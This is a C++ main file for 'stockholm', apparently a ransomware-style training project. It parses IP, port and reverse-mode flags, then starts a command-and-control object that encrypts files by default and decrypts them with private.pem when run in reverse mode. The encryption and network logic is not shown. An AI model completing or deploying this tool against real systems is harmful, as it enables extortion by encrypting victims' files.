#include "../incs/c2_stockholm.hpp"


int main(int argc, char** argv) {
    std::string ip_address = DEFAULT_IP;
    int port = DEFAULT_PORT;
    CommandCode cmd = CMD_CIPHER;

    std::unique_ptr<C2Stockholm> c2_stockholm;

    if (argc < 2 || argc > 7) {
        std::cerr << RED << "Error: Invalid number of arguments" << RESET << std::endl;
        std::cout << CYAN << "./stockholm -h too see all the available commands" << RESET << std::endl;
        return -1;
    }

    for (int i=0;i<argc;i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            std::cout << CYAN << "Usage: ./stockholm [-hr] -i <IP address> -p <port>" << RESET << std::endl;
            std::cout << CYAN << "Description:" << RESET << std::endl;
            std::cout << CYAN << "\t-h, --help\t\tDisplay this help message" << RESET << std::endl;
            std::cout << CYAN << "\t-i <IP_ADDRESS>. By default 0.0.0.0 is used" << RESET << std::endl;
            std::cout << CYAN << "\t-p <PORT>. By default 2323 is used" << RESET << std::endl;
            std::cout << CYAN << "\t-r, --reverse\t\tReverse deciphered files using private.pem" << RESET << std::endl;
            return 0;
        } else if (strcmp(argv[i], "--reverse") == 0 || strcmp(argv[i], "-r") == 0) {
            // Call the reverse function here
            if (std::filesystem::exists("private.pem")) {
                std::cout << YELLOW << "Reverse mode activated" << RESET << std::endl;
                cmd = CMD_DECIPHER;
            } else {
                std::cerr << RED << "Error: private.pem not found" << RESET << std::endl;
                return -1;
            }
        } else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            ip_address = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            std::string port_str = argv[++i];
            if (!std::all_of(port_str.begin(), port_str.end(), ::isdigit)) {
                std::cerr << RED << "Error: Port must be a numeric value" << RESET << std::endl;
                return -1;
            }
            
            try {
                port = std::stoi(port_str);
                if (port < 0 || port > 65535) {
                    throw std::out_of_range("Port out of range");
                }
            } catch (const std::invalid_argument& e) {
                std::cerr << RED << "Error: Invalid port number" << RESET << std::endl;
                return -1;
            } catch (const std::out_of_range& e) {
                std::cerr << RED << "Error: Port number out of range" << RESET << std::endl;
                return -1;
            }
        }
    }

    std::cout << CYAN << R"(
                
    
         __  ______   ___     ___ __ __ __  __   ___   __    ___  ___
        (( \ | || |  // \\   //   || // ||  ||  // \\  ||    ||\\//||
         \\    ||   ((   )) ((    ||<<  ||==|| ((   )) ||    || \/ ||
        \_))   ||    \\_//   \\__ || \\ ||  ||  \\_//  ||__| ||    ||
        
    
    (C) Link-Wolf
    (C) viv4ldi

    )" << std::endl;


    std::cout << GREEN << "Using IP address: " << ip_address << RESET << std::endl;
    std::cout << GREEN << "Using Port: " << port << RESET << std::endl;

    c2_stockholm = std::make_unique<C2Stockholm>(ip_address, port);
    c2_stockholm->run(cmd);
    c2_stockholm->cleanup();

    return 0;
}